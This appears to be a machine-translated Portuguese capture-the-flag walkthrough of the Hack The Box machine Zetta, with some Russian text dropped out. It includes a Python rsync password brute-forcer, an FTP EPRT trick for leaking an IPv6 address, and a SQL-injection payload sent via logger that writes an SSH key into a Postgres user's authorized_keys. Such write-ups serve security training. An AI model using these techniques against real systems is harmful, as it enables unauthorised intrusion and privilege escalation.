<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏼‍🤝‍👨🏻 🧗🏽 🥡 Hack The Box - Passo a passo de Zetta FXP, IPv6, rsync, Postgres e SQLi ☹️ 👨🏾‍🤝‍👨🏼 🤰🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuo publicando soluções enviadas para processamento adicional no site da HackTheBox . Espero que isso ajude pelo menos alguém a se desenvolver no...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Passo a passo de Zetta FXP, IPv6, rsync, Postgres e SQLi</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/489588/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nn/1m/6i/nn1m6ihaiw2kzu-lt_868yjvd0e.png" alt="imagem"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Continuo publicando soluções enviadas para </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">processamento adicional</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> no site da </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Espero que isso ajude pelo menos alguém a se desenvolver no campo da segurança da informação. </font><font style="vertical-align: inherit;">Neste artigo, aprendemos o endereço do servidor IPv6 usando FXP, trabalhamos com rsync e também escrevemos a chave ssh usando injeção SQL ao processar logs no Postgres. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A conexão ao laboratório é via VPN. </font><font style="vertical-align: inherit;">É recomendável não conectar-se a partir de um computador de trabalho ou de um host em que os dados importantes estejam disponíveis, pois você entra em uma rede privada com pessoas que sabem algo no campo da segurança da informação :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informações Organizacionais</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta máquina possui um endereço IP 10.10.10.156, que eu adiciono ao / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.156    zetta.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, examinamos portas abertas. </font><font style="vertical-align: inherit;">Como leva muito tempo para varrer todas as portas com o nmap, primeiro farei isso com o masscan. </font><font style="vertical-align: inherit;">Examinamos todas as portas TCP e UDP da interface tun0 a uma velocidade de 500 pacotes por segundo.</font></font><br>
<br>
<pre><code class="plaintext hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.156 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/4s/y1/5o/4sy15okn_gqkagrrpwuug7gnznu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em seguida, você precisa coletar mais informações sobre portas conhecidas. </font><font style="vertical-align: inherit;">Para fazer isso, use o nmap com a opção -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A zetta.htb -p21,22,80</code></pre><br>
<img src="https://habrastorage.org/webt/hb/2w/5n/hb2w5n8whv-z2w5qsocdpklonhe.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veja o que está no ftp. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vl/qh/do/vlqhdo8g-smq-zqbwvq0pgsb9x8.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como resultado, o banner diz que podemos nos conectar via IPv6. Vamos ver o que está no servidor da web. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ni/dg/0r/nidg0rvziobssbym9jntimqmdnu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observamos o FTP nativo com suporte para FXP. FXP é uma maneira de transferir arquivos entre dois servidores FTP diretamente, sem baixá-los para o seu computador. Durante uma sessão FXP, o cliente abre duas conexões FTP para dois servidores diferentes, solicitando um arquivo no primeiro servidor, indicando o endereço IP do segundo servidor no comando PORT. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yo/hp/6v/yohp6v4sud37g7xbj5bmfz7chws.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rolando um pouco, encontramos o nome de usuário e a senha do FTP. E depois de inserir as credenciais, somos informados de que há suporte para FXP. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sv/wy/_l/svwy_ltj2rlmdqxfbrqsc5ei_0s.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas ou não há arquivos no servidor ou eles não nos são fornecidos. Mas como esse servidor suporta FXP, podemos fingir ser outro servidor, o servidor de destino iniciou uma conexão. Assim, revelaremos seu endereço IPv6 de acordo com a RFC 2428.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5j/cw/cd/5jcwcdyngu_e36q63fxucohgerq.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/w2/bw/bt/w2bwbtcccse4gqvyl3xu0bf-jjc.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Isso é necessário para uma varredura adicional, pois o host pode ter serviços que aceitam apenas conexão IPv6. </font><font style="vertical-align: inherit;">Então, precisamos saber o nosso endereço. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5h/in/pn/5hinpn5tcmapocqvpuemvhrjv0m.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Usando tcpdump, rastrearemos o tráfego que vai para a porta 4321. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/gy/ik/ckgyiky5qs4afqu8wzrdudjhg5i.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E usando o netcat nos conectamos ao ftp e especificamos as credenciais.</font></font><br>
<br>
<pre><code class="bash hljs">nc zetta.htb 21</code></pre><br>
<img src="https://habrastorage.org/webt/hl/e2/k1/hle2k12hpzyoxmzm_y95juvhrim.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E agora enviamos a solicitação EPRT. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dk/jt/tu/dkjttuf_ntvdl4qta4zizfrr6sg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E observamos o endereço IPv6 do host de destino. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wc/mn/1b/wcmn1bimjdf4qrzobuqg0romjxw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora grave-o no / etc / hosts em vez do IPv4 e verifique todas as portas usando o nmap, adicionando a opção -6.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -6 zetta.htb -p-</code></pre><br>
<img src="https://habrastorage.org/webt/0k/pm/q6/0kpmq61u_comgc9lbaihvg9puqg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora, obtemos mais informações usando a opção -A. </font></font><br>
<br>
<pre><code class="bash hljs">nmap -A -6 zetta.htb -p21,22,80,8730</code></pre><br>
<img src="https://habrastorage.org/webt/uo/gq/bj/uogqbj8xp1mz9a9ceb77zp2_3be.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ponto de entrada</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rsync (sincronização remota) é um programa para sistemas do tipo UNIX que sincroniza arquivos e diretórios em dois locais, minimizando o tráfego. </font><font style="vertical-align: inherit;">O Rsync pode copiar ou exibir o conteúdo de um diretório e copiar arquivos, opcionalmente usando compactação e recursão. </font><font style="vertical-align: inherit;">O rsync transfere apenas alterações de arquivo, o que afeta o desempenho do programa. </font><font style="vertical-align: inherit;">Vamos ver a lista de módulos.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 --list-only rsync://zetta.htb:8730/</code></pre><br>
<img src="https://habrastorage.org/webt/tc/kg/u9/tckgu9il7s2cys7xvhkpt3lbu5a.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alguns diretórios importantes estão ausentes nesta lista. </font><font style="vertical-align: inherit;">Mas o diretório etc estava disponível.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -av rsync://zetta.htb:8730/etc/rsync*</code></pre><br>
<img src="https://habrastorage.org/webt/3x/zn/bd/3xznbdntaiz3zqnr2qf3tlqebn4.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lemos rsyncd.conf, para este arquivo na máquina local.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 -a rsync://zetta.htb:8730/etc/rsyncd.conf .</code></pre><br>
<img src="https://habrastorage.org/webt/ai/oj/5s/aioj5sgqyn10hypi_wekrkvgr6e.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Há um módulo oculto no config - home_roy, que aponta para o diretório inicial do usuário roy, e é protegido por senha contra rsyncd.secrets, mas não está disponível para nós.</font></font><br>
<br>
<pre><code class="bash hljs">rsync -6 rsync://zetta.htb:8730/home_roy/</code></pre><br>
<img src="https://habrastorage.org/webt/gp/ai/tq/gpaitq8zbh7h_omn16zt_8lbgwg.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DO UTILIZADOR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quando não havia mais idéias, tive que resolver a senha. </font><font style="vertical-align: inherit;">Para isso, o código Python foi escrito e uma lista de senhas dos Seclists foi usada.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span>():</span>
    sys.stdout.write(<span class="hljs-string">"\033[F"</span>)<font></font>
    sys.stdout.write(<span class="hljs-string">"\033[K"</span>)<font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:<font></font>
    passwords = f.read().split(<span class="hljs-string">'\n'</span>)<font></font>
<font></font>
<span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<font></font>
    s = process([<span class="hljs-string">"rsync"</span>, <span class="hljs-string">"-6"</span>, <span class="hljs-string">"rsync://roy@zetta.htb:8730/home_roy"</span>], env={<span class="hljs-string">"RSYNC_PASSWORD"</span>:password})<font></font>
    clear()<font></font>
    clear()<font></font>
    print((<span class="hljs-string">"password: "</span> + password).ljust(<span class="hljs-number">30</span>, <span class="hljs-string">" "</span>), end=<span class="hljs-string">"\r\r"</span>)<font></font>
    <font></font>
    s.recvuntil(<span class="hljs-string">"\"Cloud sync\".\n\n\n"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">b"@ERROR:"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.recv():<font></font>
        print(<span class="hljs-string">"found!!!"</span>)
        <span class="hljs-keyword">break</span><font></font>
    s.close()<font></font>
clear()</code></pre><br>
<img src="https://habrastorage.org/webt/3k/2t/ox/3k2toxpkr2nxsoyirv6uhtrsphu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora que sabemos a senha, vamos gerar a chave ssh e carregá-la no servidor. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/zz/xf/cw/zzxfcwouoxqbcrszv0xj9xsnlwm.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/jp/1i/yd/jp1iydqlhrg09qwr_wxx3x26t2u.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/mb/u2/zq/mbu2zqozz2yasm3m8cub5kduinq.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E conectando-se via SSH com essa chave, pegamos o token do usuário.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rg/ji/li/rgjiliy_quszvw3zeavyvzzzh6u.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RAIZ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ao lado do token, há uma dica - uma lista de tarefas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fa/lk/vg/falkvgcgyh9rm3chrb7hhxpfv1k.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos abri-los.</font></font><br>
<br>
<pre><code class="bash hljs">todo .tudu.xml</code></pre><br>
<img src="https://habrastorage.org/webt/tf/a8/8i/tfa88iedz9lf3q6tw_9ac6shiwi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver todas as tarefas planejadas. O servidor usa git. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hs/va/en/hsvaen3j6aqirokrcxp-ln_o_yu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nesse caso, os logs de eventos são salvos no banco de dados. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o_/hu/zb/o_huzbgm3rsgv_fx4snwunlx1a8.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E também planeja alterar a senha, que no momento parece um certo tipo. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/iv/j8/lx/ivj8lxpkgnjthvvbzzeug4svrpa.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A primeira coisa que fazemos é ir para o git, porque podemos ver o histórico de mudanças na configuração. Encontre todos os diretórios .git no servidor. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/l4/sx/o8/l4sxo8jxdwdocgmom11ckwm2yxc.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como estamos mais interessados ​​no diário rsyslog, copio todo o repositório na máquina local. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dd/ye/jf/ddyejf3czw-r_zhoduuxikbvixi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora vamos ao diretório com o repositório carregado e usamos o gitk (a interface gráfica é um pouco, mas conveniente).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/gv/wp/_k/gvwp_ktsoxxersdc0wgb2fsgfaq.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vemos as credenciais, mas se as usamos, falhamos. </font><font style="vertical-align: inherit;">Também no repositório, você pode ver o modelo de acordo com o qual os logs são colocados no banco de dados. </font><font style="vertical-align: inherit;">Os logs são salvos no log /var/log/postgresql/postgresql-11-main.log, acessível ao grupo adm do qual somos membros. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ey/fw/nc/eyfwncj05y0shcz54xhvvkwbd0k.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como estamos lidando com um banco de dados, você pode tentar a injeção. </font><font style="vertical-align: inherit;">Criaremos eventos para gravação usando o logger, rastreando simultaneamente em tempo real o que entra no log (por conveniência, você pode usar o qterminal com uma janela dividida) usando o watch.</font></font><br>
<br>
<pre><code class="bash hljs">watch -n 1 cat postgresql-11-main.log</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E envie o evento.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"'"</span></code></pre><br>
<img src="https://habrastorage.org/webt/_y/3b/e9/_y3be9zcxrq42sst-dh4ncxa08q.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E ocorre um erro que indica uma possível injeção. </font><font style="vertical-align: inherit;">Observando / etc / passwd, descobrimos que o usuário do serviço postgres possui o / bin / bash shell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gb/ox/dp/gboxdpbfnz-zz70uyuh_czinjvq.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Assim, podemos entrar via ssh. </font><font style="vertical-align: inherit;">Isso nos dará acesso ao arquivo postgres, incluindo o histórico de comandos. </font><font style="vertical-align: inherit;">Vamos verificar se podemos escrever um arquivo usando injeção.</font></font><br>
<br>
<pre><code class="bash hljs">logger -p local7.info <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$RALF\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/tmp/ralf\$\$;-- -"</span></code></pre><br>
<img src="https://habrastorage.org/webt/j_/pq/wx/j_pqwxpez02yfqe1qriziegnr7o.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bem. </font><font style="vertical-align: inherit;">Geraremos a chave ssh e gravamos a chave pública no servidor no diretório inicial do serviço de usuário do postgres: /var/lib/postgresql/.ssh/authorized_keys.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5s/uj/8k/5suj8kpixestfadzh-0qk9dpx74.png" alt="imagem"><br>
<br>
<pre><code class="bash hljs">logger -p local7.info -s <span class="hljs-string">"qwerty',\$\$2020-02-02\$\$);DROP TABLE if exists ralf;CREATE TABLE ralf(t TEXT);INSERT INTO ralf(t) VALUES(\$\$ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRC9/M7mhpZ/0Rs/HyPIC58k3qDu3xRVmMgt/gky8VCpH49WVkkLpW0tFNL1Z7d/NN8efres0+aG7VJXop20P4uO7BT4ikK8ccDzXKHlSVPweevKu8AAVqu98mKxXJBNI/uQ1giv+zwS23hbe5DQTGldeOSPzClxal8sj99kqCk1aN8Cs7I6+vBcOkHoMVKB8dR9Hu0ZwvLzvWDnnBR1txmjrNDPt25I+2gNc3JYvqIS2QIV2DSdh5UoFKVzA27Mav3A0yL6zJjUynnluAa27HMsKdvrfA0Q5zIY3F/snHCl4X/wxZh4o9bnfxUFt6OC0sLxk5ro1Vw6EjgACZj+aFoFXBMgX59YpUVtXbXvN/ACMkIyLh/f7CvqWDD9sppZtcBKVYB1jzlqIG5ekgv55aCrTeX9CuS9YbZrrjZC2Dos7YTOwD9TBItlR8VcU0JcR1GiS+GHZv0Rm9pizHchOiPocWqdryoGqfTfCav4AvrhDHtzk4P/C1fa3flwb3NxE= root@Ralf-PC\$\$);SELECT * FROM ralf;COPY ralf(t) TO \$\$/var/lib/postgresql/.ssh/authorized_keys\$\$;-- -"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora vamos ao ssh.</font></font><br>
<br>
<pre><code class="bash hljs">ssh -i psg_id_rsa postgres@zetta.htb</code></pre><br>
<img src="https://habrastorage.org/webt/7l/sb/_8/7lsb_8guzm_cw3r-xlk7rtvtixs.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nós olhamos para a história do postgres. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0z/fl/zi/0zflzicvn8fciw1ubk4i3r_v1iw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E encontramos a senha. </font><font style="vertical-align: inherit;">Lembramos a regra de senha da lista de tarefas, substituímos o usuário por root e efetuamos login. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d0/eh/_e/d0eh_e4fitq3ce5smvxmu6rvbqw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos com plenos direitos! </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Você pode se juntar a nós no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vamos montar uma comunidade na qual haverá pessoas versadas em muitas áreas da TI, para que possamos sempre ajudar uns aos outros em qualquer problema de segurança da TI e da informação.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt489568/index.html">Conferência DEFCON 27. Duplicação de chaves mecânicas com acesso limitado. Parte 1</a></li>
<li><a href="../pt489576/index.html">Нюансы современной медицины</a></li>
<li><a href="../pt489582/index.html">Em busca de Godzilla. Redes neurais e cotações de previsão baseadas em trocas e dados "externos"</a></li>
<li><a href="../pt489584/index.html">Como melhorar seu serviço de API no node.js. Parte 1</a></li>
<li><a href="../pt489586/index.html">Visualização de som em lâmpadas vintage</a></li>
<li><a href="../pt489590/index.html">E se o programador não tiver nada para fazer constantemente?</a></li>
<li><a href="../pt489594/index.html">Framework vs Platform: qual a diferença?</a></li>
<li><a href="../pt489596/index.html">O resumo de materiais interessantes para o desenvolvedor móvel nº 334 (de 17 a 23 de fevereiro)</a></li>
<li><a href="../pt489600/index.html">GDC-2020: o que esperar de uma das maiores exposições de desenvolvimento de jogos</a></li>
<li><a href="../pt489602/index.html">Pré-renderizador em tela 2D</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>